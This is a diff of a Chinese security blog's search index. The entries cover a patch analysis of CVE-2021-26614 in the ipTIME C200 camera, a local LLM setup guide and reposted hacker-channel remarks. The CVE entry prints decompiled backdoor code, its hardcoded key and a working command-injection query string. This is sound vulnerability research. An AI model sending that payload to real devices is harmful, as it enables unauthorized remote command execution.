@@ -1,6 +1,91 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CVE-2021-26614 ipTIME摄像头RCE漏洞分析</title>
+    <url>/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><blockquote>
+<p>□ Overview<br>o EFMNetworks Co.,Ltd released security update to address remote code execution vulnerability in IpTime C200 camara.<br>Vulnerability Type	Impact	Severity	CVSS Score	CVE ID<br>Exposed dangerous method<br>or function	remote code execution	High	7.5	CVE-2021-26614<br>□ Description<br>o ius_get.cgi in IpTime C200 camera allows remote code execution. A remote attacker may send a crafted parameters to the exposed vulnerable web service interface which invokes the arbitrary shell command.</p>
+<p>□ Affected Product<br>Product	Version	Platform<br>IpTime C200 Camera	1.058 or prior	Ubuntu 20.04</p>
+<p>□ Solution<br>o Update firmware over IpTime C200 Camera 1.060 version or higher.</p>
+<p>□ Reference<br>[1] <a href="http://iptime.com/iptime/?page_id=126&pageid=1&mod=&keyword=C200&uid=24015">http://iptime.com/iptime/?page_id=126&amp;pageid=1&amp;mod=&amp;keyword=C200&amp;uid=24015</a></p>
+<p>□ Acknowledgements<br>[1] Thanks to Inhyeong Yi and Jaehyeong Yi for reporting this vulnerability.</p>
+</blockquote>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该漏洞存在于版本<code>1.06</code>之前，并已发布版本，尝试进行补丁分析</p>
+<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>首先下载前后两个固件并解包</p>
+<ul>
+<li><a href="https://iptime.com/iptime/?pageid=2&page_id=126&keyword=C200&uid=24015&mod=document">https://iptime.com/iptime/?pageid=2&amp;page_id=126&amp;keyword=C200&amp;uid=24015&amp;mod=document</a></li>
+</ul>
+<p>没有加密，直接binwalk解包即可</p>
+<p>查找目标文件<code>iux_get.cgi</code></p>
+<p><img src="/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240729151425537.png" alt="image-20240729151425537"></p>
+<p>对这两个<code>iux_get.cgi</code>进行diff对比</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[  3:18PM ]  [ c0r3dump@ArchLinux:/mnt/hgfs/shared_dir/diff_dir ]</span><br><span class="line"> $ <span class="built_in">ls</span> -lh ./</span><br><span class="line">total 171K</span><br><span class="line">-rwxrwxrwx 1 root root 86K Jul 29 15:16 iux_get_58.cgi</span><br><span class="line">-rwxrwxrwx 1 root root 86K Jul 29 15:18 iux_get_60.cgi</span><br><span class="line">[  3:18PM ]  [ c0r3dump@ArchLinux:/mnt/hgfs/shared_dir/diff_dir ]</span><br><span class="line"> $ <span class="built_in">cp</span> ../_c200_1_060.bin.extracted/squashfs-root/usr/www/cgi/iux_get.cgi ./iux_get_60.cgi</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Bindiff</p>
+<ul>
+<li><a href="https://github.com/google/bindiff/releases">https://github.com/google/bindiff/releases</a></li>
+<li>指定IDA安装位置后使用</li>
+</ul>
+<p><img src="/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240729155246852.png" alt="image-20240729155246852"></p>
+<p>只有一个<code>0x401B04</code>相似度偏差最大</p>
+<p><img src="/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240729155711415.png" alt="image-20240729155711415"></p>
+<p>删除了此部分逻辑，进行查看</p>
+<p><img src="/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240729155909989.png" alt="image-20240729155909989"></p>
+<p>具体定位到如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v3 = (<span class="type">const</span> <span class="type">char</span> *)getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v15, <span class="number">1024</span>, <span class="string">&quot;%s&quot;</span>, v3);</span><br><span class="line">  v4 = (<span class="type">const</span> <span class="type">char</span> *)sub_40C890(v15, <span class="string">&quot;tmenu&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v17, <span class="number">32</span>, <span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  v5 = (<span class="type">const</span> <span class="type">char</span> *)sub_40C890(v15, <span class="string">&quot;smenu&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v18, <span class="number">32</span>, <span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  v6 = (<span class="type">const</span> <span class="type">char</span> *)sub_40C890(v15, <span class="string">&quot;act&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v19, <span class="number">32</span>, <span class="string">&quot;%s&quot;</span>, v6);  </span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;cam&quot;</span>, v17) &amp;&amp; !<span class="built_in">strcmp</span>(<span class="string">&quot;debug&quot;</span>, v18) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_409748((<span class="type">int</span>)v15);</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>从请求的变量中获取参数</li>
+<li><code>tmenu=cam &amp;&amp; smenu=debug</code></li>
+<li>sub_409748</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_409748</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// $t8</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">int</span> cmdString; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">512</span>]; <span class="comment">// [sp+2Ch] [+2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">4100</span>]; <span class="comment">// [sp+22Ch] [+22Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5 = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;act&quot;</span>);              <span class="comment">// 返回act参数对应的值，即atc=value,返回value</span></span><br><span class="line">  <span class="keyword">if</span> ( !v5 || <span class="built_in">strcmp</span>(v5, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v8 = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;aaksjdkfj&quot;</span>);        <span class="comment">// 返回aaksjdkfj参数对应的value</span></span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)v8 == <span class="string">&#x27;1&#x27;</span>                      <span class="comment">// value: 11dnjsrurelqjrm22</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">2</span>) == <span class="string">&#x27;d&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">3</span>) == <span class="string">&#x27;n&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">4</span>) == <span class="string">&#x27;j&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">5</span>) == <span class="string">&#x27;s&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">6</span>) == <span class="string">&#x27;r&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">7</span>) == <span class="string">&#x27;u&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">8</span>) == <span class="string">&#x27;r&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">9</span>) == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">10</span>) == <span class="string">&#x27;l&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">11</span>) == <span class="string">&#x27;q&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">12</span>) == <span class="string">&#x27;j&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">13</span>) == <span class="string">&#x27;r&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">14</span>) == <span class="string">&#x27;m&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">15</span>) == <span class="string">&#x27;2&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">16</span>) == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;html&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;center&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;form method=get action=\&quot;iux_get.cgi\&quot; name=\&quot;dform\&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;input type=hidden name=tmenu value=\&quot;cam\&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;input type=hidden name=smenu value=\&quot;debug\&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;input type=hidden name=act value=1&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;File Name : &lt;input type=text name=\&quot;fname\&quot; value=\&quot;\&quot; size=50 maxlength=120&gt;&lt;br&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Command Name : &lt;input type=text name=\&quot;cmd\&quot; value=\&quot;\&quot; size=64 maxlength=256&gt;&lt;br&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;input type=text name=\&quot;aaksjdkfj\&quot; value=\&quot;%s\&quot; size=64 maxlength=256&gt;&lt;br&gt;&lt;br&gt;\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v8);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;input type=submit name=\&quot;dapply\&quot; value=\&quot; Show \&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;/form&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">    v6 = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;act&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &amp;&amp; !<span class="built_in">strcmp</span>(v6, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;fname&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = fopen(v9, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( fgets(v10, <span class="number">256</span>, v3) )</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;&lt;font size=-1&gt;%s&lt;/font&gt;&lt;br&gt;\n&quot;</span>, v10);</span><br><span class="line">          fclose(v3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;file open error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cmdString = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;cmd&quot;</span>);   <span class="comment">// 获取cmd参数的value</span></span><br><span class="line">      <span class="keyword">if</span> ( cmdString )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_409660(cmdString, v11);             <span class="comment">// 将其拷贝到v11</span></span><br><span class="line">        <span class="built_in">snprintf</span>(v10, <span class="number">512</span>, <span class="string">&quot;%s &gt;&gt; /var/run/cmd_temp&quot;</span>, v11);<span class="comment">// inject,例如 ls /; id</span></span><br><span class="line">        system(v10);</span><br><span class="line">        v4 = fopen(<span class="string">&quot;/var/run/cmd_temp&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>综上分析，即可知poc如下, 即可命令注入</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;tmenu=cam&amp;smenu=debug&amp;act=1&amp;aaksjdkfj=11dnjsrurelqjrm22&amp;cmd=<span class="built_in">whoami</span>;<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://web.archive.org/web/20211209121323/https://www.boho.or.kr/krcert/secNoticeView.do?bulletin_writing_sequence=36346">https://web.archive.org/web/20211209121323/https://www.boho.or.kr/krcert/secNoticeView.do?bulletin_writing_sequence=36346</a></p>
+<p><a href="https://www.iotsec-zone.com/article/135">https://www.iotsec-zone.com/article/135</a></p>
+]]></content>
+      <tags>
+        <tag>IoT</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LobeChat本地运行llama2-chinese大模型</title>
+    <url>/2024/07/15/LobeChat%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8Cllama2-chinese%E5%A4%A7%E6%A8%A1%E5%9E%8B/</url>
+    <content><![CDATA[<h2 id="Ollama"><a href="#Ollama" class="headerlink" title="Ollama"></a>Ollama</h2><p><a href="https://ollama.com/">https://ollama.com/</a></p>
+<p>此处下载安装，需要设置如下环境变量</p>
+<p><img src="/2024/07/15/LobeChat%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8Cllama2-chinese%E5%A4%A7%E6%A8%A1%E5%9E%8B/image-20240715222211820.png" alt="image-20240715222211820"></p>
+<p>此处发现可用中文大模型较少，只有一个<code>llama2-chinese</code></p>
+<ul>
+<li>7b参数，对GPU要求低<code>8G</code>即可</li>
+</ul>
+<p>安装使用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ollama pull llama2-chinese</span><br><span class="line">ollama run llama2-chinese</span><br></pre></td></tr></table></figure>
+
+<h2 id="LobeChat"><a href="#LobeChat" class="headerlink" title="LobeChat"></a>LobeChat</h2><p><a href="https://lobehub.com/zh">https://lobehub.com/zh</a></p>
+<p>可以用来本地部署的前端，当然也可以调用其他模型</p>
+<p>使用Docker进行部署</p>
+<ul>
+<li><a href="https://www.docker.com/">https://www.docker.com/</a></li>
+</ul>
+<p>对于Docker，修改了如下配置</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Expose daemon on tcp://localhost:2375 without TLS</span><br><span class="line">Disk image location</span><br></pre></td></tr></table></figure>
+
+<p>一键Docker安装<code>LobeChat</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 3210:3210 -e OLLAMA_PROXY_URL=http://host.docker.internal:11434/v1 lobehub/lobe-chat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 之后可以 docker stop/start进行退出，启动</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/15/LobeChat%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8Cllama2-chinese%E5%A4%A7%E6%A8%A1%E5%9E%8B/image-20240715222941954.png" alt="image-20240715222941954"></p>
+<p>之后对话切换模型，即可使用</p>
+<p><img src="/2024/07/15/LobeChat%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8Cllama2-chinese%E5%A4%A7%E6%A8%A1%E5%9E%8B/image-20240715223031465.png" alt="image-20240715223031465"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>好像确实没有在线的<code>ChatGPT4-o</code>好用</p>
+]]></content>
+      <tags>
+        <tag>AI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>OpenAI APIKey申请教程</title>
     <url>/2024/06/01/OpenAI-APIKey%E7%94%B3%E8%AF%B7%E6%95%99%E7%A8%8B/</url>
     <content><![CDATA[<p><code>GPT-4o</code>发布后，默认的账户可以限时使用了。在一次的问题提问过程中，发现确实要比<code>GPT-3.5</code>效果好不少，于是决定购买一些API的使用量。</p>
@@ -52,40 +137,6 @@
       </tags>
   </entry>
   <entry>
-    <title>LobeChat本地运行llama2-chinese大模型</title>
-    <url>/2024/07/15/LobeChat%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8Cllama2-chinese%E5%A4%A7%E6%A8%A1%E5%9E%8B/</url>
-    <content><![CDATA[<h2 id="Ollama"><a href="#Ollama" class="headerlink" title="Ollama"></a>Ollama</h2><p><a href="https://ollama.com/">https://ollama.com/</a></p>
-<p>此处下载安装，需要设置如下环境变量</p>
-<p><img src="/2024/07/15/LobeChat%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8Cllama2-chinese%E5%A4%A7%E6%A8%A1%E5%9E%8B/image-20240715222211820.png" alt="image-20240715222211820"></p>
-<p>此处发现可用中文大模型较少，只有一个<code>llama2-chinese</code></p>
-<ul>
-<li>7b参数，对GPU要求低<code>8G</code>即可</li>
-</ul>
-<p>安装使用</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ollama pull llama2-chinese</span><br><span class="line">ollama run llama2-chinese</span><br></pre></td></tr></table></figure>
-
-<h2 id="LobeChat"><a href="#LobeChat" class="headerlink" title="LobeChat"></a>LobeChat</h2><p><a href="https://lobehub.com/zh">https://lobehub.com/zh</a></p>
-<p>可以用来本地部署的前端，当然也可以调用其他模型</p>
-<p>使用Docker进行部署</p>
-<ul>
-<li><a href="https://www.docker.com/">https://www.docker.com/</a></li>
-</ul>
-<p>对于Docker，修改了如下配置</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Expose daemon on tcp://localhost:2375 without TLS</span><br><span class="line">Disk image location</span><br></pre></td></tr></table></figure>
-
-<p>一键Docker安装<code>LobeChat</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 3210:3210 -e OLLAMA_PROXY_URL=http://host.docker.internal:11434/v1 lobehub/lobe-chat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 之后可以 docker stop/start进行退出，启动</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/07/15/LobeChat%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8Cllama2-chinese%E5%A4%A7%E6%A8%A1%E5%9E%8B/image-20240715222941954.png" alt="image-20240715222941954"></p>
-<p>之后对话切换模型，即可使用</p>
-<p><img src="/2024/07/15/LobeChat%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8Cllama2-chinese%E5%A4%A7%E6%A8%A1%E5%9E%8B/image-20240715223031465.png" alt="image-20240715223031465"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>好像确实没有在线的<code>ChatGPT4-o</code>好用</p>
-]]></content>
-      <tags>
-        <tag>AI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>R2S软路由搭建指南</title>
     <url>/2024/08/02/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
     <content><![CDATA[<p>在一般访问Google等网站的情况下，往往需要在每个终端安装代理软件，如<code>Clash</code>，<code>SSR</code>等。而软路由的方式让我们对其访问变得无感。百科上对软路由的定义如下，即使用软件的方案来进行路由：</p>
@@ -125,6 +176,107 @@
 ]]></content>
       <tags>
         <tag>日常</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>灰袍推送Mark</title>
+    <url>/2021/10/02/%E7%81%B0%E8%A2%8D%E6%8E%A8%E9%80%81Mark/</url>
+    <content><![CDATA[<p>最近浏览了灰袍推送的tg频道，记录一些有意思的言论。灰袍推送中有些关于<strong>方法论</strong>、<strong>工程化</strong>、<strong>区块链</strong>的东西很有让人眼前一亮的感觉在此记录一下，方便以后查看。</p>
+<span id="more"></span>
+
+<h2 id="来自-灰袍推送"><a href="#来自-灰袍推送" class="headerlink" title="来自@灰袍推送"></a>来自@灰袍推送</h2><ol>
+<li><p>论黑客工程化是我们的追求。黑客工程化是我们的追求。黑客工程化的意思是：我们的所有技能需要成体系活动，能交给机器的都交给机器，我们控制机器“木偶们”来加速我们的效率。为了最优这个工程化，我们很明白什么技能是必须精通的，什么技能是够用就好，什么技能是拿来主义。</p>
+</li>
+<li><p>那个“安全技能树”圈子，新人太多，我一旦分享点复杂的，似乎都安静了。对于陌生的知识怎么办？先 mark，以后有机会再消化，没机会也无所谓，至少知道有这个就好。对于不陌生的，赶紧跟上实践。实战派，不废话。指的就是这个。</p>
+</li>
+<li><p>灰帽 C#，这本书很不错，玩 Win 渗透的，建议这本书实操完。</p>
+</li>
+<li><p>什么黑客技术是好技术？黑产或 APT 组织已经在实战的技术 。</p>
+</li>
+<li><p>很多人不明白什么是职业什么是业余，什么是兴趣什么是工作。举个例子，黑客攻防，是我兴趣，也是工作，更成为了职业。而玩玩比特币、打打王者荣耀、吃吃小龙虾虽也是兴趣，但很业余，我不会通过这种方式去赚钱，能赚到也是投机罢了，如果能成大事，那也是投机，命运选中了我而已。再往细了说，黑客攻防分支领域几十条，也仅某些条会是我的职业，而有不少仅仅是业余，如打 CTF、玩黑手等。</p>
+</li>
+<li><p>通读两本行业一流的书籍是最稳的入门进阶方式。</p>
+</li>
+<li><p>设计一个商业模式的快感大于设计一个软件工程，不过都小于挖到一个大 0day，因为大 0day 自带牛逼的商业模式😄。</p>
+</li>
+<li><p>那些老协议，没认证与加密设计的，都会出大问题，多个 S 多关键。<a href="https://rtpbleed.com/">https://rtpbleed.com</a></p>
+</li>
+<li><p>天天喊发干货的人，我就问你 Kali 的每个工具你都了解过没，哪怕绝大多数点开看看都没吧？都懒成这样，是懒还是蠢？</p>
+</li>
+<li><p>干货拿走，消化一年再说：<a href="https://github.com/coreb1t/awesome-pentest-cheat-sheets">https://github.com/coreb1t/awesome-pentest-cheat-sheets</a></p>
+</li>
+<li><p>钓鱼攻击类型我总结几类：普通域名钓鱼、双因素钓鱼、XSS 高级钓鱼、CSRF 高级钓鱼、浏览器扩展钓鱼、系统木马钓鱼、MITM 钓鱼。这些细节在我的硬盘里。</p>
+</li>
+<li><p>建议大家开始关注“区块链”技术，在自己的技能树上多一个这个是好事，至少可以很好避免成为投机者中的韭菜。玩安全的，可以探索这个领域的安全问题。</p>
+</li>
+<li><p>不小心连续发的都是区块链相关的观点。做安全就是这样，需要跟上时代。区块链安全里，我们会把其分为两大类：区块链本身的安全，区块链之上各类业务的安全。对于我们来说，区块链本身的安全是我们的技能短板，里面大量的安全问题是需要算法、架构、工程的整体思考。如果不能深入到区块链创造细节里去，这类的安全从何研究？</p>
+</li>
+<li><p>未来的世界是去中心化与中心化的博弈平衡，绝对不会有完美的去中心化生态，原因请自行阅读《自私的基因》…</p>
+</li>
+<li><p>安全研究第一步：<strong>目标攻击面</strong>都有哪些？第二步：<strong>攻击路径如何描绘</strong>出来？这两大步骤是最考验安全人员经验及想象力的地方。</p>
+</li>
+<li><p>区块链世界最伟大的点在于：通过技术信仰吸引一批信徒且都利益绑定了。</p>
+</li>
+<li><p>比特币网络新增两个杀手锏，一个是闪电网络，一个是 RSK。</p>
+</li>
+<li><p>《麻省理工科技评论》2018 年“全球十大突破性技术” ：<a href="http://mp.weixin.qq.com/s//_kdbSRdIwr4bIXfNtut8Fw%EF%BC%8C%E5%8C%BF%E5%90%8D%E8%B4%A7%E5%B8%81Zcash%E5%9C%A8%E5%8D%81%E5%A4%A7%E4%B9%8B%E4%B8%80%E9%87%8C%E8%A2%AB%E6%8F%90%E5%8F%8A%E3%80%82">http://mp.weixin.qq.com/s/\_kdbSRdIwr4bIXfNtut8Fw，匿名货币Zcash在十大之一里被提及。</a></p>
+</li>
+<li><p>看到 bettercap 从 Ruby 改为 Go，就等着 MSF 和 BeEF 了。黑客工程化的世界，要么 Python 要么 Go，其他都是小众，JavaScript 还差些火候。</p>
+</li>
+<li><p>Google 说了“您应始终使用 HTTPS 保护您的所有网站，即使这些网站并不处理敏感的通信。</p>
+</li>
+<li><p>你猜为什么？尤其是那些区块链世界的网站，即使上面没 Web 钱包，没交易所功能。</p>
+</li>
+<li><p>DNS Rebinding 技巧用于钱包节点 HTTP RPC 的攻击确实很猥琐，上古时代的技巧到现在还是这么的帅！</p>
+</li>
+<li><p>DNS这种设计一直是信息安全头顶的一朵乌云。</p>
+</li>
+</ol>
+<p><img src="/2021/10/02/%E7%81%B0%E8%A2%8D%E6%8E%A8%E9%80%81Mark/dns.jpg" alt="文本, 电子邮件  描述已自动生成"></p>
+<ol start="24">
+<li><p>当年门罗币背后的那些人设计出这个币种时有没有预见过，这个举动无意间让网络世界和平了不少:-)</p>
+</li>
+<li><p>一次漂亮的分享最大的利己是：极其加深自己对所分享知识的印象。</p>
+</li>
+<li><p>一个好漏洞从发现到 PoC 到 Exploit 到 Attack 到 Defense 到披露，可以完美打通一次任督二脉。这样的机会不多，多珍惜。</p>
+</li>
+<li><p>过了遍比特币生态网络里的 RSK 生态解决方案及相关源码，他们对安全有不错的理解，尤其是他们应该早有意识到以太坊生态安全缺陷，这点很赞。</p>
+</li>
+<li><p>以太坊智能合约的出现让软件工程师真的可以对得起工程师称号，多好的事。</p>
+</li>
+<li><p>创业最爽的是还能亲自带队攻克两个核心能力：1. 0day；2. 黑客工程。</p>
+</li>
+<li><p>玩前端黑只需掌握 Chrome DevTools 就好:-)</p>
+</li>
+<li><p>区块链本质根本不是什么去中心，而是利益共识。明白这点就行了。而我是游走在两个极端之间的人，我只知道这里存在很多安全攻防博弈。乱，浮，和你我无关，我们改变不了。</p>
+</li>
+<li><p>最快的成长方式就是实战中成长，比如你拿到攻击者的样本，立马可以吸收其手法精髓，防御上就可以有的放矢。再比如为了突破，你死磕到底，一回头会发现：卧槽，掌握了各种技巧，而这许多是死磕前绝无法想象到的。</p>
+</li>
+<li><p>创造比纯粹的 Hacking 更重要，但 Hacking 才能促进更独特的创造。</p>
+</li>
+<li><p>探索本质这是黑客必须具备的基本素质。</p>
+</li>
+<li><p>DApp 游戏本质是一场“代码即法律”的黑客游戏。</p>
+</li>
+<li><p>黑客的初阶是逆向思维，进阶则是正向思维。</p>
+</li>
+<li><p>区块链领域的黑客几乎都不是曾经的黑客，他们几乎都是很懂区块链的技术人员，且带了点逆向思维。曾经的黑客几乎都过时了，绝大多数没机会在这个新领域开天辟地，只能费劲地跟着。</p>
+</li>
+<li><p>5G 与 IoT 时代的风险与机遇：<a href="https://threatpost.com/the-danger-and-opportunity-in-5g-connectivity-and-iot/138493/">https://threatpost.com/the-danger-and-opportunity-in-5g-connectivity-and-iot/138493/</a> 如果 IPv6 也大量启用，那对网络空间测绘来说，是个新挑战🤔。</p>
+</li>
+<li><p>我说我们在做区块链安全，其实我们在做都是公链生态的安全，慢雾的机会仅在这，如果这个生态没了，慢雾也会沉静甚至消失。是的，所谓的联盟链、私链不是我们的机会，我们的机会在自由的网络空间里:-)</p>
+</li>
+<li><p><a href="https://mp.weixin.qq.com/s/s-gxfYsGUeosiRwpXoWN6w">https://mp.weixin.qq.com/s/s-gxfYsGUeosiRwpXoWN6w</a></p>
+</li>
+<li><p>维基解密新年推文里问：2019，你认为哪些被泄露的档案最能改变我们对人类文明的理解？… 要搞大事？</p>
+</li>
+</ol>
+<h2 id="来自-Ton-OKEx中文频道"><a href="#来自-Ton-OKEx中文频道" class="headerlink" title="来自@Ton&amp;OKEx中文频道"></a>来自@<strong>Ton&amp;OKEx中文频道</strong></h2><ol>
+<li>Ton区块链继承自Telegram，旨在为数十亿用户提供服务。它拥有超快的交易速度、低廉的费用和易于使用的原生应用程序，其中一些应用程序可以直接在Telegram中使用，如 @wallet 或 @cryptobot 。</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>转载</tag>
